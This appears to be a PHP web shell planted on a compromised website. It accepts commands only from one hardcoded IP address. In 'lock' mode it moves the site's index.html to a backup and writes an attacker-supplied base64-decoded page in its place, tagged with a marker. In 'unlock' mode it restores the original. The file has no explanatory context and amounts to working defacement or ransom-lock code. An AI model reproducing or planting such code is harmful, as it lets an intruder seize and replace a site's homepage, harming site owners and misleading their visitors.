<?php
$allowed_ips = array('95.213.180.26');
if(!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)){die('Error!');}

if ( isset($_POST['mode']) ) {
    $mode = $_POST['mode'];
}else{
    die('ERROR');
}

if ( isset($_POST['template']) ) {
    $template = $_POST['template'];
}else{
    die('ERROR');
}

if ($mode == '1') {
    if ( !file_exists(dirname(__FILE__) . '/index.html.bak') ) {
        
        if ( file_exists(dirname(__FILE__) . '/index.html') ) {
            $locked_idx = file_get_contents(dirname(__FILE__) . '/index.html');

            if (stripos($locked_idx, 'f675d6afdebb4293be1ba7a03df23b22') !== false) {
                die('ALREADY_LOCKED');
            }
        }

        if (file_exists(dirname(__FILE__) . '/index.html')) {
            rename(dirname(__FILE__) . '/index.html', dirname(__FILE__) . '/index.html.bak');
        }

        $put_result = file_put_contents(dirname(__FILE__) . '/index.html', base64_decode($template) . "\r\n<!--f675d6afdebb4293be1ba7a03df23b22-->");

        if ($put_result !== false) {
            die('OK_LOCKED');
        }else{
            die('FAIL_ON_LOCK');
        }

    }else{
        die('ALREADY_LOCKED');
    }
}

if ($mode == '2') {
    if ( file_exists(dirname(__FILE__) . '/index.html.bak') ) {
        
        rename(dirname(__FILE__) . '/index.html.bak', dirname(__FILE__) . '/index.html');

        die('OK_UNLOCKED');
    }else{
        if ( file_exists(dirname(__FILE__) . '/index.html') ) {
            $locked_idx = file_get_contents(dirname(__FILE__) . '/index.html');

            if (stripos($locked_idx, 'f675d6afdebb4293be1ba7a03df23b22') !== false) {
                unlink(dirname(__FILE__) . '/index.html');
                die('OK_UNLOCKED');
            }else{
                die('FAIL_ON_UNLOCK');
            }
        }else{
            die('FAIL_ON_UNLOCK');
        }
    }



}

?>